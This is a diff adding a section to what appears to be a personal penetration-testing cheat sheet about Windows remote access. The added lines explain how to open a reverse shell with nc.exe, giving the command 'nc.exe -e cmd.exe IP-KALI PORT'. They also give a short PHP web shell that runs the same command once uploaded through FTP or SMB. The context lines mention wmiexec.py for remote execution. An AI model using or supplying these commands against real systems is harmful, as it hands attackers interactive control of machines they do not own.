@@ -44,3 +44,15 @@ Microsoft Windows [Version 10.0.19044.1288]
 C:\Windows\system32>
 ```
 - We can also try with: wmbexec.py or wmiexec.py (same command except for name of the script of course)
+
+### Get a shell with nc.exe
+
+- If we have access to a win and need to get a reverse shell for some reason (like privesc or else) we can use nc.exe
+- You can get it here if you are on kali `/usr/share/windows-resources/binaries/nc.exe`
+- Once on the target you can launch it with `nc.exe -e cmd.exe IP-KALI PORT`
+- You could even put this line in a php file if say you had access to an ftp or smb that are used to transfer files to serve 
+```
+<?php
+system('nc.exe -e cmd.exe IP-KALI PORT')
+?>
+```
